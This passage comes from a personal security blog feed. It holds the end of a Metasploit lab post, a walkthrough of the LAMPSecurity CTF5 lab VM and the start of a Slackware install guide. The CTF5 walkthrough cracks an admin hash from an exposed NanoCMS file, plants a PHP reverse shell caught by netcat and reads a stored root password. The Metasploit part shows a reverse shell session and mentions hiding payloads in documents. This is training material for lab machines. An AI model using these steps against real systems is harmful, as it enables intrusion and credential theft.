<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(handler) &gt; run 
</span><span class='line'>
</span><span class='line'>[*] Started reverse TCP handler on 192.168.80.155:4444 
</span><span class='line'>[*] Starting the payload handler...
</span><span class='line'>[*] Sending stage (336 bytes) to 192.168.80.128
</span><span class='line'>[*] Command shell session 1 opened (192.168.80.155:4444 -&gt; 192.168.80.128:49196) at 2016-06-08 11:19:16 -0400
</span><span class='line'>
</span><span class='line'>Microsoft Windows [Version 6.1.7601]
</span><span class='line'>Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
</span><span class='line'>
</span><span class='line'>C:\Users\wingoat\Desktop&gt;</span></code></pre></td></tr></table></div></figure>


<p>Success! This demo was pretty straightforward, but if executables attract too much attention on the target, you can try to sneak your payload into PDFs or Word documents instead.</p>

<h5>Conclusion</h5>

<p>This was a long post, but I wanted to showcase many of Metasploit&rsquo;s capabilities. It was a fun lab, but I barely scratched the surface of what&rsquo;s possible.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ Don't hate yourself in the morning -- \
</span><span class='line'>\ sleep till noon.                      /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - LAMPSecurity CTF5]]></title>
    <link href="http://chousensha.github.io/blog/2016/05/05/pentest-lab-lampsecurity-ctf5/"/>
    <updated>2016-05-05T12:24:38-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/05/05/pentest-lab-lampsecurity-ctf5</id>
    <content type="html"><![CDATA[<p>Continuing the LAMPSecurity series, the next machine I&rsquo;m going after is CTF5.</p>

<!-- more -->


<h3>Recon</h3>

<p>Nmap scan reveals there are plenty of open ports:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sS -sV -p1-65535 192.168.80.154
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.49BETA5 ( https://nmap.org ) at 2016-05-09 12:17 EDT
</span><span class='line'>Nmap scan report for 192.168.80.154
</span><span class='line'>Host is up, received arp-response (0.00024s latency).
</span><span class='line'>Not shown: 65524 closed ports
</span><span class='line'>Reason: 65524 resets
</span><span class='line'>PORT      STATE SERVICE     REASON         VERSION
</span><span class='line'>22/tcp    open  ssh         syn-ack ttl 64 OpenSSH 4.7 (protocol 2.0)
</span><span class='line'>25/tcp    open  smtp        syn-ack ttl 64 Sendmail 8.14.1/8.14.1
</span><span class='line'>80/tcp    open  http        syn-ack ttl 64 Apache httpd 2.2.6 ((Fedora))
</span><span class='line'>110/tcp   open  pop3        syn-ack ttl 64 ipop3d 2006k.101
</span><span class='line'>111/tcp   open  rpcbind     syn-ack ttl 64 2-4 (RPC #100000)
</span><span class='line'>139/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X (workgroup: MYGROUP)
</span><span class='line'>143/tcp   open  imap        syn-ack ttl 64 University of Washington IMAP imapd 2006k.396 (time zone: -0400)
</span><span class='line'>445/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X (workgroup: MYGROUP)
</span><span class='line'>901/tcp   open  http        syn-ack ttl 64 Samba SWAT administration server
</span><span class='line'>3306/tcp  open  mysql       syn-ack ttl 64 MySQL 5.0.45
</span><span class='line'>38972/tcp open  status      syn-ack ttl 64 1 (RPC #100024)</span></code></pre></td></tr></table></div></figure>


<p>I searched for exploits for the versions of the listed services, but I couldn&rsquo;t find anything usable. So it&rsquo;s back to the web server..</p>

<h4>Web server</h4>

<p>The website provides some potential entry points that we&rsquo;ll have to take a closer look at:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf5/phake.png" title="phake home" alt="phake org"></p>

<p>We can register for a mailing list:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf5/list.png" title="mail list" alt="mailing list"></p>

<p>Tampering with the about page URL <code><a href="http://192.168.80.154/?page=about">http://192.168.80.154/?page=about</a></code> gives errors, so LFI might be possible</p>

<p>The blog page also has an admin login page and another Squirrel Mail page:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf5/blog.png" title="blog" alt="blog"></p>

<p>The contact form allows you to send a message to the staff, and there is another app that acts as an event manager:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf5/event.png" title="event manager" alt="event planner"></p>

<p>Also, on port 901 there is a Samba SWAT server protected by basic authentication. This server provides a web-based interface for configuring Samba.</p>

<h3>Exploiting the CMS</h3>

<p>I made an account on the event manager, but that doesn&rsquo;t seem to help me much besides creating new blog posts. Next I tested to see if there might be any SQLi in the contact form, but no luck there either. And despite the path traversal error, I wasn&rsquo;t able to navigate to any arbitrary files on the system.</p>

<p>It turns out I had actually overlooked an important information. On Andy Carp&rsquo;s blog, we can see the site is powered by NanoCMS. I noticed it but I didn&rsquo;t give it any thought. When I finally thought to click on it and learn more, it took me to a domain-for-sale page, so I figured it might be some simulated CMS created for this challenge only. Good that I thought to google it and see how wrong I was :p <a href="https://github.com/kalyan02/NanoCMS">NanoCMS</a> is a lightweight CMS based on PHP that is now discontinued. However, I found a super useful <a href="http://www.madirish.net/304">NanoCMS security review</a> that made possible the compromising of the target ;)</p>

<p>Among the vulnerabilities present in the CMS, there is one that allows unrestricted access to the <code>/data/pagesdata.txt</code>. This file contains the username and password hash of the administrator:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>a:12:{s:8:"homepage";s:1:"1";s:10:"links_cats";a:4:{s:7:"sidebar";a:2:{i:0;i:1;i:1;i:4;}s:11:"other-pages";a:0:{}s:14:"top-navigation";a:2:{i:0;s:1:"1";i:1;s:1:"4";}s:12:"Footer-Right";a:2:{i:0;s:1:"1";i:1;s:1:"4";}}s:5:"slugs";a:2:{i:1;s:4:"home";i:4;s:7:"contact";}s:6:"titles";a:2:{i:1;s:4:"Home";i:4;s:7:"Contact";}s:10:"slug_count";i:11;s:8:"settings";a:3:{s:19:"index-last-modified";i:1234513760;s:18:"def-template-areas";a:4:{i:0;s:12:"website name";i:2;s:14:"website slogan";i:3;s:16:"below navigation";i:4;s:16:"copyright notice";}s:18:"def-template-links";a:2:{i:0;s:14:"top-navigation";i:1;s:12:"Footer-Right";}}s:13:"active-tweaks";a:2:{i:0;s:7:"deutsch";i:1;s:19:"language-pack-tweak";}s:11:"lang-select";s:7:"english";s:6:"seourl";s:1:"0";s:8:"username";s:5:"admin";s:8:"password";s:32:"9d2f75377ac0ab991d40c91fd27e52fd";s:7:"version";s:4:"v_4f";}</span></code></pre></td></tr></table></div></figure>


<p>I cracked the hash with my favorite <a href="https://hashkiller.co.uk/md5-decrypter.aspx">online cracker</a> and found out the password is <em>shannon</em>. Next, I logged in to the admin panel:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf5/nanocms.png" title="nanocms admin panel" alt="admin panel"></p>

<p>Now we have the ability to add new pages with our own PHP code. I used <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">pentestmonkey&rsquo;s reverse PHP shell</a>. I changed the IP and port, and set up a netcat listener to catch the reverse connection. Then I clicked on the newly created page on the blog and looked to my netcat for the goodies:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vvnlp 5555
</span><span class='line'>listening on [any] 5555 ...
</span><span class='line'>connect to [192.168.80.155] from (UNKNOWN) [192.168.80.154] 43028
</span><span class='line'>Linux localhost.localdomain 2.6.23.1-42.fc8 #1 SMP Tue Oct 30 13:55:12 EDT 2007 i686 i686 i386 GNU/Linux
</span><span class='line'> 11:02:41 up  3:30,  0 users,  load average: 0.24, 0.05, 0.02
</span><span class='line'>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'>uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
</span><span class='line'>sh: no job control in this shell
</span><span class='line'>sh-3.2$ whoami
</span><span class='line'>apache</span></code></pre></td></tr></table></div></figure>


<p>Time for some enumeration! Looking in the home directory, I noticed quite a few user folders:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-3.2$ ls
</span><span class='line'>amy
</span><span class='line'>andy
</span><span class='line'>jennifer
</span><span class='line'>loren
</span><span class='line'>patrick</span></code></pre></td></tr></table></div></figure>


<p>I looked inside them with <code>ls -al</code>. The content was very similar among them and I could find nothing interesting in the files I was allowed to read. Until patrick&rsquo;s directory, that contained more hidden files than the others:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-3.2$ ls -al patrick
</span><span class='line'>total 344
</span><span class='line'>drwxrwxr-x 25 patrick patrick 4096 Dec  5  2012 .
</span><span class='line'>drwxr-xr-x  7 root    root    4096 Apr 28  2009 ..
</span><span class='line'>-rw-------  1 patrick patrick    0 Dec  5  2012 .ICEauthority
</span><span class='line'>drwx------  2 patrick patrick 4096 Apr 28  2009 .Trash
</span><span class='line'>-rw-------  1 patrick patrick  530 Dec  5  2012 .bash_history
</span><span class='line'>-rw-r--r--  1 patrick patrick   33 Aug 31  2007 .bash_logout
</span><span class='line'>-rw-r--r--  1 patrick patrick  176 Aug 31  2007 .bash_profile
</span><span class='line'>-rw-r--r--  1 patrick patrick  124 Aug 31  2007 .bashrc
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 .config
</span><span class='line'>-rw-r--r--  1 patrick patrick   28 Apr 29  2009 .dmrc
</span><span class='line'>drwxrwxr-x  8 patrick patrick 4096 Apr 29  2009 .evolution
</span><span class='line'>drwx------  5 patrick patrick 4096 Dec  5  2012 .gconf
</span><span class='line'>drwx------  2 patrick patrick 4096 Dec  5  2012 .gconfd
</span><span class='line'>drwxrwxr-x  3 patrick patrick 4096 Apr 28  2009 .gnome
</span><span class='line'>drwxr-xr-x  7 patrick patrick 4096 Dec  5  2012 .gnome2
</span><span class='line'>drwx------  2 patrick patrick 4096 Apr 28  2009 .gnome2_private
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 .gstreamer-0.10
</span><span class='line'>-rw-rw-r--  1 patrick patrick  146 Dec  5  2012 .gtk-bookmarks
</span><span class='line'>-rw-r--r--  1 patrick patrick   89 Apr 28  2009 .gtkrc-1.2-gnome2
</span><span class='line'>drwxr-xr-x  3 patrick patrick 4096 Apr 28  2009 .local
</span><span class='line'>-rw-rw-r--  1 patrick patrick   18 Apr 29  2009 .mailboxlist
</span><span class='line'>drwx------  3 patrick patrick 4096 Apr 28  2009 .metacity
</span><span class='line'>drwx------  3 patrick patrick 4096 Apr 28  2009 .mozilla
</span><span class='line'>-rw-------  1 patrick patrick   37 Apr 29  2009 .mysql_history
</span><span class='line'>drwxr-xr-x  3 patrick patrick 4096 Dec  5  2012 .nautilus
</span><span class='line'>-rw-rw-r--  1 patrick patrick  773 Dec  5  2012 .recently-used.xbel
</span><span class='line'>drwxrwxr-x  4 patrick patrick 4096 Dec  5  2012 .tomboy
</span><span class='line'>-rw-r--r--  1 patrick patrick 5128 Dec  5  2012 .tomboy.log
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Dec  5  2012 .wapi
</span><span class='line'>-rw-r--r--  1 patrick patrick  847 Dec  5  2012 .xsession-errors
</span><span class='line'>-rw-r--r--  1 patrick patrick  658 Oct 11  2007 .zshrc
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Desktop
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Documents
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Download
</span><span class='line'>-rw-------  1 patrick patrick  509 Apr 29  2009 Drafts
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Music
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Pictures
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Public
</span><span class='line'>-rw-------  1 patrick patrick 4329 Apr 29  2009 Sent
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Templates
</span><span class='line'>-rw-------  1 patrick patrick 1243 Apr 29  2009 Trash
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Videos
</span><span class='line'>-rwxrw----  1 patrick patrick    0 Apr 29  2009 test.txt</span></code></pre></td></tr></table></div></figure>


<p>I couldn&rsquo;t read the .mysql_history or test.txt files, but the next one I tried, the <code>.tomboy.log</code> file, was really interesting! I only show the interesting bits here:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-3.2$ cat .tomboy.log
</span><span class='line'>...
</span><span class='line'>12/5/2012 7:24:34 AM [DEBUG]: Creating Buffer for 'New Note 3'...
</span><span class='line'>12/5/2012 7:24:34 AM [DEBUG]: New Note 3 tags:
</span><span class='line'>12/5/2012 7:24:38 AM [DEBUG]: Saving 'New Note 3'...
</span><span class='line'>12/5/2012 7:24:46 AM [DEBUG]: Renaming note from New Note 3 to Root password
</span><span class='line'>12/5/2012 7:24:56 AM [DEBUG]: Saving 'Root password'...
</span><span class='line'>12/5/2012 7:25:03 AM [DEBUG]: Saving 'Root password'...
</span><span class='line'>12/5/2012 7:27:41 AM [DEBUG]: Received request for saving session
</span><span class='line'>12/5/2012 7:27:41 AM [DEBUG]: Saving unsaved notes...
</span><span class='line'>12/5/2012 7:27:41 AM [DEBUG]: All done.  Ciao!</span></code></pre></td></tr></table></div></figure>


<p>Tomboy is a note-taking application and it looks like the root password was saved in a note?! I went to the <code>.tomboy</code> directory and found some notes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-3.2$ ls
</span><span class='line'>481bca0d-7206-45dd-a459-a72ea1131329.note
</span><span class='line'>addin-db-000
</span><span class='line'>addins
</span><span class='line'>ae9cfc26-64e8-4f6f-a8b4-0296e8173504.note
</span><span class='line'>d2684fad-3aab-444c-b90a-4f307c0818f6.note
</span><span class='line'>manifest.xml</span></code></pre></td></tr></table></div></figure>


<p>Found the jackpot in the first one!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-3.2$ cat 481bca0d-7206-45dd-a459-a72ea1131329.note
</span><span class='line'>&lt;?xml version="1.0" encoding="utf-8"?&gt;
</span><span class='line'>&lt;note version="0.2" xmlns:link="http://beatniksoftware.com/tomboy/link" xmlns:size="http://beatniksoftware.com/tomboy/size" xmlns="http://beatniksoftware.com/tomboy"&gt;
</span><span class='line'>  &lt;title&gt;Root password&lt;/title&gt;
</span><span class='line'>  &lt;text xml:space="preserve"&gt;&lt;note-content version="0.1"&gt;Root password
</span><span class='line'>
</span><span class='line'>Root password
</span><span class='line'>
</span><span class='line'>50$cent&lt;/note-content&gt;&lt;/text&gt;
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>Now all that is left is to become root! I SSH&#8217;ed with the root credentials and the machine is mine now!</p>

<h5>Concluding remarks</h5>

<p>This was another cool challenge in the LAMPSecurity series! The exploitation was possible because of the vulnerable CMS that not only disclosed credentials, but also allowed an attacker to execute code on the target. Although the foothold gained was under an unprivileged user, certain files of the home directories were readable when they shouldn&rsquo;t have been, and the root password was sitting in an unprotected file for anyone to read. A good example of how a chain of misconfigurations can lead to total compromise of a machine.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ It's lucky you're going so slowly, \
</span><span class='line'>| because you're going in the wrong  |
</span><span class='line'>\ direction.                         /
</span><span class='line'> ------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Slackware install guide]]></title>
    <link href="http://chousensha.github.io/blog/2016/04/28/slackware-install-guide/"/>
    <updated>2016-04-28T13:23:59-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/04/28/slackware-install-guide</id>
    <content type="html"><![CDATA[<p>Ever since I got into Linux and wanting to learn more and get better at it, I always held an interest towards Slackware. Being one of the oldest distributions around, with a hardcore community and an old-school reputation, it always came in the top answers when it comes to learning Linux without fancy hand holding and the like (along with Arch). But I always liked Slackware, its name is awesome, and well, slackwarez for a slacker! So I&rsquo;ve finally set up some time to install it in a VM, and will get to work on it to deepen my Linux knowledge.</p>

<p>So in this post I will list the steps I went through to install Slackware 14.1 in VMware.</p>

<!-- more -->


<p>The cool thing about this installation was that I had to do some things manually without a GUI where all you do is press next. After selecting your installation media, which was the DVD ISO for me, power up the machine and you will get some command line action!</p>

<p>The first screen is for selecting which kernel to boot to</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/bootkernel.png" title="boot to kernel" alt="kernel booting"></p>

<p>Select keyboard map</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/keyboard.png" title="keyboard map" alt="select key map"></p>

<p>Log in as root</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/root.png" title="root login" alt="root login"></p>

<h3>Partitioning</h3>

<p>You have to set up partitions before beginning the installation process</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/partition.png" title="partition" alt="partitioning"></p>

<p>I will use cfdisk for this. As you can see, my disk is /dev/sda and is yet yet unpartitioned, so just a big lump of free space.</p>

<blockquote><p>cfdisk &ndash; display or manipulate a disk partition table</p></blockquote>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/cfdisk.png" title="cfdisk" alt="cfdisk"></p>

<p>I will make 3 partitions, for swap, root and home. Select [New] to create a new partition. The MBR partitioning scheme supports up to 4 primary partitions, and if you need more than that you can make one of them an extended partition and create  logical partitions inside it. Choose [Primary] to continue</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/primary.png" title="primary partition" alt="primary partition"></p>

<p>Since this will be the swap partition, I will make it a size of 512 MB.</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/size.png" title="partition size" alt="swap size"></p>

<p>Next I selected to place it at the beginning of the drive, for simplicity. I&rsquo;ve also read that doing so might make it faster.</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/beginning.png" title="partition beginning" alt="beginning partition"></p>

<p>Note how the first partition labeled sda1 was created. Next you have to choose the partition&rsquo;s type</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/type.png" title="partition type" alt="partition type"></p>

<p>See how many different file systems can be created. Choose 82 for swap.</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/swap.png" title="type swap" alt="swap partition"></p>

<p>Next make the root and home partitions, as described above. Only difference will be that you need to make the root partition bootable</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/bootable.png" title="bootable partition" alt="root bootable"></p>

<p>Now write the changes to disk. You will be asked to confirm that you want to write the data</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/write.png" title="write partitions" alt="write data"></p>

<p>After it&rsquo;s done you will see a message at the bottom: &ldquo;Wrote partition table to disk&rdquo;. You can quit cfdisk now</p>

<h3>Setup</h3>

<p>Type setup to begin the installation setup process</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/slacksetup.png" title="slackware setup" alt="install setup"></p>

<p>Choose ADDSWAP to format the swap partition that was created earlier. It will be automatically detected by the setup wizard</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/swapsetup.png" title="add swap" alt="swap setup"></p>

<p>You can choose to check for bad blocks if you want, but I skipped it</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/badblocks.png" title="check bad blocks" alt="bad blocks"></p>

<p>You will get a message when the swap space is configured</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/swapdone.png" title="swap conf" alt="swap conf"></p>

<p>Next you have to choose the root partition, which in my case is sda2</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/sda2root.png" title="root partition" alt="root sda2"></p>

<p>I selected the quick format option</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/formatroot.png" title="root format" alt="quick format"></p>

<p>For the filesystem I chose ext4</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/ext4.png" title="ext4" alt="ext4"></p>

<p>The last partition is the home one</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/sda3home.png" title="sda3 home" alt="home"></p>

<p>After formatting and choosing its filesystem, you have to specify where you want it mounted. Type /home</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/home.png" title="mount home" alt="home"></p>

<p>The setup of the partitions is now complete</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/partitionsdone.png" title="partitions complete" alt="finished partitioning"></p>

<p>Next you have to choose the source media for the installation. In my case, it is the DVD</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/sourcemedia.png" title="source media" alt="source dvd"></p>

<p>Let the wizard auto scan for the DVD</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/autoscan.png" title="autoscan" alt="dvd scan"></p>

<p>Select the general packages that you want, I kept all except for the KDE ones, since I will be using XFCE for my GUI</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/packages.png" title="package selection" alt="install packages"></p>

<p>I chose the full option for simplicity</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/full.png" title="full install" alt="full"></p>

<p>After the installation process, you can create a boot stick if you want, but I skipped it</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/bootdisk.png" title="boot stick" alt="boot disk"></p>

<p>The bootloader used by Slackware is LILO. I selected the simple install and the standard console</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/lilo.png" title="lilo" alt="lilo"></p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/lilosplash.png" title="lilo splash screen" alt="lilo console"></p>

<p>Skip the extra parameters unless you know what you&rsquo;re doing</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/kernelparams.png" title="lilo extra parameters" alt="lilo parameters"></p>

<p>You will next be prompted where to install they bootloader. I chose the MBR, since this is a VM dedicated to Slackware. But if this was on a dual booting system with Windows, you would want to install it on root</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/lilombr.png" title="lilo mbr" alt="lilo install"></p>

<p>Choose your mouse type</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/mouse.png" title="mouse type" alt="mouse"></p>

<p>The General Purpose Mouse software provides support for mouse devices in Linux virtual consoles.</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/gpm.png" title="general purpose mouse" alt="gpm"></p>

<p>Next is the network configuration</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/net.png" title="network" alt="net config"></p>

<p>Enter your hostname and domain</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/hostname.png" title="hostname" alt="host"></p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/domain.png" title="domain name" alt="domain"></p>

<p>For simplicity, I chose the Network Manager configuration</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/netconf.png" title="network configuration" alt="network config"></p>

<p>Confirm your choices before continuing</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/netdone.png" title="network setup" alt="net setup"></p>

<p>I went with the default startup services. Will add more on a need-to-use basis</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/startup.png" title="startup services" alt="startup"></p>

<p>You can try custom screen fonts if you want</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/fonts.png" title="custom fonts" alt="screen fonts"></p>

<p>Next is the hardware clock and timezone</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/hwclock.png" title="hardware clock" alt="clock"></p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/timezone.png" title="timezone" alt="timezone"></p>

<p>For the GUI, I went with XFCE</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/gui.png" title="gui" alt="xfce"></p>

<p>You will be asked to choose a root password next</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/pass.png" title="root password" alt="password"></p>

<p>With this, the installation setup is complete</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/complete.png" title="setup complete" alt="setup finished"></p>

<p>Exit the wizard and reboot your brand new Slackware machine. Hit Enter when you see the splash screen, or it will boot automatically in a couple of minutes</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/slacksplash.png" title="lilo splash screen" alt="lilo boot"></p>

<h3>Booting into your system</h3>

<p>Slackware doesn&rsquo;t run the GUI automatically. You can change this by modifying the default runlevel</p>

